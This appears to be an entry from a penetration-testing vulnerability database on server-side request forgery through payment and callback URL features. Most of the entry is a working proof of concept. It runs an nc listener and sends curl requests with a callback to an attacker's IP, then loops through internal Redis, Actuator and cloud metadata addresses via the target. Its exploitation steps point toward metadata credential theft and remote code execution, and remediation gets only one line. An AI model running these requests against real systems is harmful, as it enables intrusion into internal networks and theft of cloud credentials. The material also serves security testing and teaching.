---
id: "callback-url-ssrf"
title: "Controllable payment / callback URL → internal SSRF (including cloud metadata)"
kind: "business-logic"
cve: null
related-cves: null
cve-note: "None (business logic)"
severity: "high"
cvss: 8.5
severity-basis: "cvss"
severity-note: null
product: "Custom payment and notification modules"
versions: "Any"
ports: "80, 443"
keywords: "callback, payment, ssrf, internal network, metadata, notify"
entry: "Payment configuration/callback URL/agent promotional-link checks"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (business logic; no CVE)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
POST /api/pay/config      {"notifyUrl":"http://..."}
POST /api/agent/checkUrl  {"url":"http://..."}
POST /api/pay/test        {"callback":"http://..."}
```

## Prerequisites

- A feature that accepts a URL for the server to visit (callbacks, image fetching, link checks).

## PoC

```bash
# 1) Confirm server-side requests using an address you control (create a DNS record or start a listener first)
nc -lvnp 8080
curl -s -X POST https://target/api/pay/test -H "Authorization: Bearer <t>" \
  -H 'Content-Type: application/json' -d '{"callback":"http://yourip:8080/x"}'
# Result: nc receives a request = requests can be initiated

# 2) Access internal services and cloud metadata (try individually; note how responses are exposed)
for u in 'http://127.0.0.1:6379/' 'http://10.0.0.5:8080/actuator' \
         'http://169.254.169.254/latest/meta-data/' \
         'http://100.100.100.200/latest/meta-data/'; do
  curl -s -X POST https://target/api/agent/checkUrl -H "Authorization: Bearer <t>" \
    -H 'Content-Type: application/json' -d "{\"url\":\"$u\"}" | head -c 200; echo
done
# Result: internal content/different error codes returned = confirmed
```

## Exploitation Steps

1. First prove that requests can be initiated (step 1), then test internal access;
2. In cloud environments, prioritize `169.254.169.254` (AWS) and `100.100.100.200` (Alibaba Cloud);
3. Successful access to Redis/Actuator can directly extend into an RCE chain;
4. Evidence: response differences (timing/length/content).

## Remediation and Mitigation

- Allowlist domains + block internal and metadata ranges; allow only https callbacks and validate signatures.

## References

- OWASP SSRF Prevention Cheat Sheet; Alibaba Cloud/AWS metadata security advisories.
